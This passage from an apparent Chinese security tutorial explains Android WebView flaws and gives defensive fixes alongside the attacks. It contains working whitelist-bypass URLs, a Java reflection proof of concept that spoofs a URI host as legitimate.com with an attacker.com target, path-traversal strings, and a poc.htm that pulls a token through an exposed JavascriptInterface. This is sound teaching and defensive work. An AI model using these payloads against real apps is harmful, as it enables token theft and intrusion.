class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>目标样本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#被攻击的APP，有漏洞的代码</span><br><span class="line"><span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.webview);</span><br><span class="line">webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);  允许加载File域</span><br><span class="line"> </span><br><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> getIntent();</span><br><span class="line"><span class="keyword">if</span> (i != <span class="literal">null</span>) &#123;</span><br><span class="line">     mUri = i.getData(); #取出了恶意HTML</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (mUri != <span class="literal">null</span>) &#123;</span><br><span class="line">    url = mUri.toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (url != <span class="literal">null</span>) &#123;</span><br><span class="line">    webView.loadUrl(url); #加载了恶意HTML</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="安全防护-3">安全防护</h6><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、设置<span class="keyword">set</span>AllowFileAccess方法为<span class="literal">false</span>,设置<span class="keyword">set</span>AllowFileAccessFromFileURLs和 </span><br><span class="line">    <span class="keyword">set</span>AllowUniversalAccessFromFileURLs为<span class="literal">false</span>。</span><br><span class="line">2、在Android4.0<span class="params">(API15)</span>及以下得采用其他方法进行手动校验是否访问file域</span><br><span class="line">3、当WebView所在Activity存在组件暴露时，若不是必要的组件暴露，应该禁止组件暴露</span><br></pre></td></tr></table></figure><h5 id="污染cookie">污染cookie</h5><p><a href="http://www.ctfiot.com/39656.html">Android-Webview中的漏洞利用总结</a></p><h4 id="URL配置漏洞">URL配置漏洞</h4><p><a href="https://www.freebuf.com/vuls/201407.html">一文彻底搞懂安卓WebView白名单校验 - FreeBuf网络安全行业门户</a></p><p>许多URL可以通过各种方式去绕过验证，从而引起各式各样的漏洞getUserInfo</p><p>URL的构造：</p><p><code>scheme://login:password@address:port/path/to/resource/?query_string#fragment</code></p><ul><li>scheme<br>不区分大小写，包括http、https、file、ftp等等,:之后的“//”可省略，例如http:www.qq.com, 此外，多数浏览器在scheme之前<strong>加空格</strong>也是可以正常解析的</li><li>login:password@（认证信息）<br>服务器有时候需要用户名和密码认证，ftp协议比较常见，http很少见，但这个<strong>不常见字段往往可以绕过</strong>很多检查</li><li>address<br>address字段可以是一个<strong>不区分大小写</strong>的域名、一个ipv4地址或带方括号的ipv6地址，部分浏览器接收ip地址的八进制、十进制、十六进制等写法</li><li>port<br>端口号</li><li>/path/to/resource<br>层级路径，可以使用“…/”到上一级目录</li><li>query_string<br>查询字符串，格式为”query_string?name1=value1&amp;name2=value2”</li><li>fragment<br>用于html中的页面定位</li></ul><h5 id="URL绕过漏洞">URL绕过漏洞</h5><p><a href="https://mabin004.github.io/2019/04/23/Android-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/">Android WebView URL检查绕过 | m4bln (mabin004.github.io)</a></p><p>看一个简单的url校验例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(checkDomain(url))&#123;</span><br><span class="line">    enableJavaScriptInterface();</span><br><span class="line">    <span class="comment">//或者webview.load(url)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用checkDomain对域名进行校验</p><p>实际中会发现这样的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(url.startsWith(<span class="string">&quot;file://&quot;</span>))&#123;</span><br><span class="line">    setJavaScriptEnbled(<span class="literal">false</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    setJavaScriptEnbled(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显这里是为了防止加载file的同源策略进行的防护，但是我们有很多绕过的方法</p><p><strong>总结</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.大写字母 <span class="keyword">File</span>:<span class="comment">//</span></span><br><span class="line"><span class="number">2</span>.前面加上空格： <span class="keyword">file</span>:<span class="comment">//</span></span><br><span class="line"><span class="number">3</span>.字符编码：“<span class="keyword">file</span>：%<span class="number">2</span>F/”</span><br><span class="line"><span class="number">4</span>.可正常访问的畸形路径：<span class="keyword">file</span>:sdcard<span class="regexp">/attack/</span>html” 或 “<span class="keyword">file</span>:<span class="regexp">/\//</span>sdcard/attack.html</span><br></pre></td></tr></table></figure><p><strong>常见的url检验</strong></p><p>url中会对首尾进行校验</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">if</span>(host.endsWith(&quot;mysite.com&quot;))&#123;</span><br><span class="line">    <span class="built_in">enableJavascriptInterface</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在问题：endsWith未闭合点号</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">绕过：evilmysite<span class="selector-class">.com</span>  <span class="comment">//恶意域名</span></span><br><span class="line">修复：<span class="built_in">endsWith</span>(<span class="string">&quot;.mysite.com&quot;</span>)</span><br></pre></td></tr></table></figure><p>使用startsWith，contains，indexOf，正则匹配等非严格字符串匹配</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(host.startsWith(<span class="string">&quot;mysite.com&quot;</span>))&#123;</span><br><span class="line">    enableJavascriptInterface();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">绕过：mysite.com<span class="meta">@oppo</span>.com</span><br></pre></td></tr></table></figure><p>contains +indexOf绕过：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">任何可以添加字符串的字段</span><br><span class="line">子域名 huawei.<span class="keyword">com</span>.mysite.<span class="keyword">com</span></span><br><span class="line">子路径 mysite.<span class="keyword">com</span>/huawei.<span class="keyword">com</span></span><br><span class="line">参数 mysite.<span class="keyword">com</span>/xxxx#huawei.<span class="keyword">com</span></span><br></pre></td></tr></table></figure><p><strong>//和第一个/之间提取host</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkDomain</span><span class="params">(String inputUrl)</span></span><br><span class="line">&#123;</span><br><span class="line">    String[] whiteList=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;huawei.com&quot;</span>,<span class="string">&quot;hicloud.com&quot;</span>&#125;;</span><br><span class="line">    String tempStr=inputUrl.replace(<span class="string">&quot;://&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    String inputDomain=tempStr.substring(<span class="number">0</span>,tempStr.indexOf(<span class="string">&quot;/&quot;</span>)); <span class="comment">//提取host</span></span><br><span class="line">    <span class="keyword">for</span> (String whiteDomain:whiteList)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (inputDomain.indexOf(whiteDomain)&gt;<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过方式：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">子域名 huawei.<span class="keyword">com</span>.mysite.<span class="keyword">com</span></span><br><span class="line">http://huawei.com@www.rebeyond.net/poc.htm</span><br><span class="line">http://<span class="variable">a:a</span>@www.huawei.<span class="keyword">com</span>:b@www.baidu.<span class="keyword">com</span> 在android中使用getHost获取到的是huawei.<span class="keyword">com</span>,但实际访问的是baidu.<span class="keyword">com</span></span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -W -<span class="selector-tag">a</span> android<span class="selector-class">.intent</span><span class="selector-class">.action</span><span class="selector-class">.VIEW</span> -d URI的值  启动这个url</span><br></pre></td></tr></table></figure><h5 id="hearachical-Uri绕过">hearachical Uri绕过</h5><p>假设我们加载的uri不是通过Uri.parse，而是通过外部直接获取，我们可以构造hearachical 来绕过</p><p>我们可以使用 HierarchicalUri 和 Java Reflection API 进行攻击，同样我们分析一个样本的URL验证</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line"></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isValidUrl</span> <span class="operator">=</span> <span class="string">&quot;https&quot;</span>.equals(uri.getScheme()) &amp;&amp; uri.getUserInfo() == <span class="literal">null</span> &amp;&amp; <span class="string">&quot;legitimate.com&quot;</span>.equals(uri.getHost());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isValidUrl) &#123;</span><br><span class="line">   webView.loadUrl(uri.toString(), getAuthHeaders()); <span class="comment">//getAuthHeaders()请求头信息</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>android.net.Uri在Android被广泛使用，但实际上他是一个抽象类 android.net.Uri$HierarchicalUri是它的子类之一。Java 反射 API 使创建能够绕过此检查的 Uri 成为可能。</p><p>通过反射传⼊⼀个scheme、authoritiy和path，构造⼀个形式为<code>https://legitimate.com@attacker.com</code>的HierachicalUri实例即可绕过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line"> </span><br><span class="line">            Uri uri;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//java反射获取类引用</span></span><br><span class="line">                <span class="type">Class</span> <span class="variable">partClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$Part&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">partConstructor</span> <span class="operator">=</span> partClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                partConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">                <span class="type">Class</span> <span class="variable">pathPartClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$PathPart&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">pathPartConstructor</span> <span class="operator">=</span> pathPartClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                pathPartConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">                <span class="type">Class</span> <span class="variable">hierarchicalUriClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$HierarchicalUri&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">hierarchicalUriConstructor</span> <span class="operator">=</span> hierarchicalUriClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                hierarchicalUriConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//构造HierachicalUri实例</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">authority</span> <span class="operator">=</span> partConstructor.newInstance(<span class="string">&quot;legitimate.com&quot;</span>, <span class="string">&quot;legitimate.com&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">path</span> <span class="operator">=</span> pathPartConstructor.newInstance(<span class="string">&quot;@attacker.com&quot;</span>, <span class="string">&quot;@attacker.com&quot;</span>);</span><br><span class="line">                uri = (Uri) hierarchicalUriConstructor.newInstance(<span class="string">&quot;https&quot;</span>, authority, path, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setData(uri);</span><br><span class="line">            intent.setClass(<span class="built_in">this</span>, TestActivity.class);</span><br><span class="line">            startActivity(intent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>文件<code>TestActivity.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">     <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">         <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line"> </span><br><span class="line">         <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">         <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> intent.getData();</span><br><span class="line"> </span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;Scheme: &quot;</span> + uri.getScheme());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;UserInfo: &quot;</span> + uri.getUserInfo());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;Host: &quot;</span> + uri.getHost());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;toString(): &quot;</span> + uri.toString());</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>漏洞防护：</strong></p><p>我们只需要让攻击的应用程序获取<code>Uri</code>攻击者控制的对象并专门使用该对象</p><p>Uri uri = Uri.parse(intent.getData().toString());</p><p>从 API 级别 28 (Android 9) 开始，<a href="https://developer.android.com/guide/app-compatibility/restrictions-non-sdk-interfaces">禁止</a>使用内部接口——但这可以通过使用<a href="https://github.com/ChickenHook/RestrictionBypass">RestrictionBypass</a>等工具轻松绕过</p><h5 id="URL-Scheme绕过">URL Scheme绕过</h5><p><strong>漏洞原理</strong></p><p>代码在进行url校验时，检查了host，但是未检查Scheme，这样我们就可以通过“javascript”绕过。</p><p>例如：</p><p>相当于执行了一行js代码，第一行通过//符号来骗过java.net.URI获取到值为www.mysite.com的host，恰好//符号在Javascript的世界里是行注释符号，所以第一行实际并没有执行；然后通过%0d%0a换行，继续执行window.location.href=’<a href="http://www.bing.com">http://www.bing.com</a>’</p><p><img src="assets/905443_CY63B8H4GFW7TGH.png" alt="image-20220730132455921"></p><p>也可以通过<code>file://www.mysite.com/sdcard/evil.html</code>绕过，某些版本WebView可正常解析为<code>file:///sdcard/evil.html</code></p><p>其中 <strong>window.location.href</strong></p><ul><li>是javascript中一个非常常用的属性，它用于获取或设置当前窗口或标签页面的URL。这个属性<strong>返回完整的URL</strong></li></ul><p><strong>漏洞复现</strong></p><p><img src="assets/905443_6G9TXKBZB6B63JZ.png" alt="image-20220730132644522"></p><p>然后进行构造html<br><img src="assets/905443_47T7BWXAEHJ3XRX.png" alt="image-20220730132704180"></p><p><strong>安全防护</strong></p><p>URL校验函数</p><p><img src="assets/905443_JGTPHZEGNU7BAGX.png" alt="image-20220730132918854"></p><p><strong>Intent Scheme校验建议写法</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="comment">//解析Intent Scheme URL</span></span><br><span class="line"><span class="number">2.</span> Intent <span class="built_in">int</span>ent = Intent.parseUri(uri， flags);</span><br><span class="line"><span class="number">3.</span><span class="comment">//禁止打开没有BROWSABLE标签的Activity</span></span><br><span class="line"><span class="number">4.</span> <span class="built_in">int</span>ent.addCategory ( <span class="string">&quot;android.intent.category.BROWSABLE&quot;</span> );</span><br><span class="line"><span class="number">5.</span><span class="comment">//禁止设置intent的组件</span></span><br><span class="line"><span class="number">6.</span> <span class="built_in">int</span>ent.setComponent( nu1l);</span><br><span class="line"><span class="number">7.</span><span class="comment">//禁止设置intent的selector</span></span><br><span class="line"><span class="number">8.</span> <span class="built_in">int</span>ent.setSelector(nul1);</span><br><span class="line"><span class="number">9.</span><span class="comment">//打开intent指向的activity</span></span><br><span class="line"><span class="number">10.</span>context.startActivityIfNeeded(<span class="built_in">int</span>ent，<span class="number">-1</span>);</span><br></pre></td></tr></table></figure><h5 id="服务器跳转漏洞绕过"><strong>服务器跳转漏洞绕过</strong></h5><p><strong>漏洞原理</strong></p><p>白名单域名内的服务端出现跳转漏洞时，仍然可以通过检查，并调用JavascriptInterface，例如我们构造一个这样的URL</p><p><code>https:</code>/<code>/</code><a href="http://www.site1.com">www.site1.com</a><code>/</code>redirect.php?url<code>=</code>https:<code>/</code>/<code>www.baidu.com</code></p><p>前面的https:<code>/</code>/<code>www.site1.com</code>/<code>redirect.php</code>是我们构造的虚拟站点，当主机访问时，打开这个url后，服务器会返回一个302响应，然后浏览器会请求指定的URL，对于具有单点登录功能的网站，这种类型的接口很常见。</p><p>然后我们就可以构造URL来绕过域名白名单：</p><p><code>https://www.site1.com/redirect.php?url=http://223.****.32:8080/poc.htm</code></p><p><strong>漏洞复现</strong></p><p>首先我们编写攻击的htm：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="variable language_">window</span>.<span class="property">myObj</span>.<span class="title function_">getToken</span>());</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后我们使用文件服务器来进行模拟<img src="assets/905443_ABKZHS9QBDVBZH8.png" alt="image-20220730114753663"></p><p>我们接着编写测试样本代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLWebView</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">JsObject</span> &#123;</span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getToken</span><span class="params">()</span> &#123;</span><br><span class="line">            Log.e(<span class="string">&quot;rebeyond&quot;</span>,<span class="string">&quot;i am in getToken&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&#123;\&quot;token\&quot;:\&quot;1234567890abcdefg\&quot;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_url_web_view);</span><br><span class="line"> </span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview4);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>());</span><br><span class="line">        webView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>());</span><br><span class="line">        webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">JsObject</span>(),<span class="string">&quot;myObj&quot;</span>);</span><br><span class="line">        String inputUrl=<span class="string">&quot;https://www.site1.com/redirect.php?url=http://223.****:8080/poc.htm&quot;</span>; <span class="comment">//ip地址自己写自己的</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (checkDomain(inputUrl))</span><br><span class="line">            &#123;</span><br><span class="line">                Log.e(<span class="string">&quot;rebeyond&quot;</span>,<span class="string">&quot;i am a white domain&quot;</span>);</span><br><span class="line">                <span class="comment">//webView.loadUrl(inputUrl);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkDomain</span><span class="params">(String inputUrl)</span> <span class="keyword">throws</span>  URISyntaxException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!inputUrl.startsWith(<span class="string">&quot;http://&quot;</span>)&amp;&amp;!inputUrl.startsWith(<span class="string">&quot;https://&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] whiteList=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;site1.com&quot;</span>,<span class="string">&quot;site2.com&quot;</span>&#125;;</span><br><span class="line">        java.net.URI url=<span class="keyword">new</span> <span class="title class_">java</span>.net.URI(inputUrl);</span><br><span class="line">        String inputDomain=url.getHost(); <span class="comment">//提取host</span></span><br><span class="line">        <span class="keyword">for</span> (String whiteDomain:whiteList)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (inputDomain.endsWith(<span class="string">&quot;.&quot;</span>+whiteDomain)) <span class="comment">//www.site1.com      app.site2.com</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们可以分析代码中有一个白名单的域名检测函数<code>checkDomain</code>,但是我们可以通过构造URL来绕过：</p><p><code>https://www.site1.com/redirect.php?url=http://223.****:8080/poc.htm</code></p><h5 id="file协议绕过">file协议绕过</h5><p><a href="https://mabin004.github.io/2019/04/23/Android-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/">Android WebView URL检查绕过</a></p><p>app经常会使用file://协议加载本地文件，通常会限制在一些特定的路径中，</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)不要用url.startWith(”file:<span class="regexp">//</span>”)来判断是否为file协议，因为“FILE:<span class="regexp">//</span>”(大小)、“File:<span class="regexp">//</span>”(大小写)、“ file:<span class="regexp">//</span>”(前边加空格)、“file:”等方式都可以绕过检测。url.contains(“file:<span class="regexp">//</span>”)更不靠谱，推荐使用getScheme()来判断协议；</span><br><span class="line">(<span class="number">2</span>)file:<span class="regexp">//</span><span class="regexp">/android_asset和file:/</span><span class="regexp">//</span>android_res 也可以../穿越</span><br><span class="line">(<span class="number">3</span>)白名单判断了“..<span class="regexp">/，但通过“..\”也是可以穿越的，例如file:/</span><span class="regexp">//</span>sdcard<span class="regexp">/..\../</span>sdcard/<span class="number">1</span>.html</span><br><span class="line">(<span class="number">4</span>)getHost有漏洞（file:<span class="regexp">//</span>a:a@www.qq.com:b@www.baidu.com使用getHost获取到的是qq.com,但实际访问的是baidu.com)</span><br><span class="line">(<span class="number">5</span>)file:<span class="regexp">//</span>baidu.com<span class="regexp">/data/</span>data/tmp 前边的baidu.com是可以不被解析的</span><br><span class="line">(<span class="number">6</span>)协议头不包括<span class="regexp">//</span><span class="regexp">/，还是仍然能够正常loadUrl，如file:mnt/</span>sdcard/filedomain.html</span><br><span class="line">(<span class="number">7</span>)白名单判断了“..<span class="regexp">/”，但通过url编码绕过，例如file:/</span><span class="regexp">//</span>data<span class="regexp">/data/</span>com.app<span class="regexp">/%2e%2e/</span>%<span class="number">2</span>e%<span class="number">2</span>e<span class="regexp">/%2e%2e/</span>sdcard/xxx</span><br><span class="line">(<span class="number">8</span>)replace(“..<span class="regexp">/“,””) 可以使用”…./</span><span class="regexp">/“绕过  替换一个../</span> 还有../存在</span><br></pre></td></tr></table></figure><h4 id="Intent-WebView">Intent + WebView</h4><h5 id="Intent访问导出组件加载恶意界面和窃取信息"><strong>Intent访问导出组件加载恶意界面和窃取信息</strong></h5><p><strong>漏洞原理</strong></p><p>主要通过WebView对外暴露的接口和Intent访问导出组件可以导致的攻击手段</p><p><strong>漏洞复现</strong></p><p>样例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 